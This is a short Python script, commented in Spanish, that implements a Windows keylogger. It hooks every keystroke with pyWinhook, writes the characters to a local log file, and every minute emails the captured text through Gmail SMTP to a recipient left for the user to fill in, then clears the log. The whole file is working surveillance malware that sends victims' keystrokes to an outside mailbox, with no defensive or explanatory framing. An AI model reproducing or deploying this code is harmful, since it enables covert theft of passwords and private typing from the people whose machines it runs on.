#Python 3.8.2 64-bit Interpeter 

import datetime
import time

import logging
import pythoncom
import pyWinhook
import smtplib

wait_seconds = 60
timeout = time.time() + wait_seconds
file_log = './data/dat.txt'


def TimeOut():
    if time.time() > timeout:
        return True
    else:
        return False


def SendEmail(user, pwd, recipient, subject, body):
    gmail_user = user
    gmail_pass = pwd
    FROM = user
    TO = recipient if type(recipient) is list else [recipient]
    SUBJECT = subject
    TEXT = body

    message = """\From: %s\nTo: %s\nSubject: %s\n\n%s
    """ % (FROM, ", ".join(TO), SUBJECT, TEXT)

    try:
        server = smtplib.SMTP("smtp.gmail.com", 578)
        server.ehlo()
        server.starttls()
        server.login(gmail_user, gmail_pass)
        server.sendmail(FROM, TO, message)
        server.close()
        print("Todo correcto, y yo que me alegro")
    except:
        print("Esto se va a poner feo")


def FormatAndSendEmail():
    with open(file_log, 'r+') as f:
        actual_date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data = f.read().replace('\n', '')
        data = 'Log capturado a las: ' + actual_date + '\n' + data
        SendEmail('', '', '', 'Nuevo log - ' + actual_date, data)  # Completar los campos

        f.seek(0)
        f.truncate(0)


def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    logging.log(10, chr(event.Ascii))
    return True


hooks_manager = pyWinhook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()

while True:
    if TimeOut():
        FormatAndSendEmail()
        timeout = time.time() + wait_seconds

    # Solucionar problema de la función
    pythoncom.PumpWaitingMessages()